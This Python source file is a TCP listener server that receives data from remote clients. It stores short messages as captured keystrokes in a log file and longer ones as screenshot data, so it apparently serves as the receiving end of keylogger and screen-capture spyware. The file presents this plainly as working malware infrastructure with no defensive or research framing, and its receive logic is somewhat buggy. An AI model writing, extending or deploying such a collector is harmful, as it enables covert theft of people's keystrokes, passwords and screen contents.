import socket
import threading
import struct
import os
from datetime import datetime

s_port = 9999
s_host = 'localhost'

# Create the CapturedImages directory if it doesn't exist
if not os.path.exists('CapturedImages'):
	os.makedirs('CapturedImages')

def handle_client(client_socket):
	# Function to handle incoming data from a connected client socket
	with client_socket:
		print('Client connected.')  # Log when a client connects
		while True:
			try:
				# Read the first 4 bytes from the client to determine the length of the incoming data
				header = client_socket.recv(4)
				if not header:
					break  # If no header is received, exit the loop

				# Unpack the size of the incoming data (big-endian unsigned integer)
				data_length = struct.unpack('!I', header)[0]
				# Receive the actual data based on the length specified in the header
				data = client_socket.recv(data_length)

				if not data:
					break  # If no data is received, exit the loop

				# Process the combined header and data
				process_data(header + data)

			except Exception as e:
				# Print any errors that occur during data reception
				print(f'Error while receiving data: {e}')
				break  # Exit the loop on error

def process_data(data):
	# Process incoming data based on its type and length
	# The first 4 bytes indicate the size of the data, so we can check the total length
	if len(data) > 4:
		# Unpack the data length from the first 4 bytes
		data_length = struct.unpack('!I', data[:4])[0]
		# Extract the actual data using the length we just unpacked
		actual_data = data[4:4 + data_length]

		if data_length > 20:  # Check if the data length indicates image data
			# It's image data, so we'll save it as a screenshot
			timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')  # Get the current timestamp
			filename = f'CapturedImages/screenshot_{timestamp}.txt'  # Format the filename
			with open(filename, 'wb') as img_file:
				img_file.write(actual_data)  # Write the image bytes to a file
			print(f'Saved screenshot data as {filename}')  # Log the saved filename
		else:
			# It's a keystroke input
			try:
				# Attempt to decode the keystroke data as UTF-8
				keystroke = actual_data.decode('utf-8')  
				with open('received_data.log', 'a') as f:
					f.write(keystroke)  # Append the keystroke to a log file
				print(f'Received keystroke: {keystroke.strip()}')  # Log the received keystroke
			except UnicodeDecodeError:
				# Handle the case where decoding fails (invalid UTF-8 data)
				print('Received invalid UTF-8 data; ignoring.')

def start_listener(host=s_host, port=s_port):
	'''Starts the socket listener to accept incoming client connections.'''
	# Create a TCP/IP socket
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# Bind the socket to the address and port specified
	server.bind((host, port))
	# Listen for incoming connections (up to x concurrent connections)
	x = 1
	server.listen(x)  
	print(f'Listening on {host}:{port}')  # Log the server's listening address in the console

	while True:
		# Accept a new client connection
		client_socket, addr = server.accept()
		print(f'Accepted connection from {addr}')  # Log the address of the connected client
		# Start a new thread to handle the client
		client_handler = threading.Thread(target=handle_client, args=(client_socket,))
		client_handler.start()  # Start the thread

if __name__ == '__main__':
	start_listener()  # Start the server listener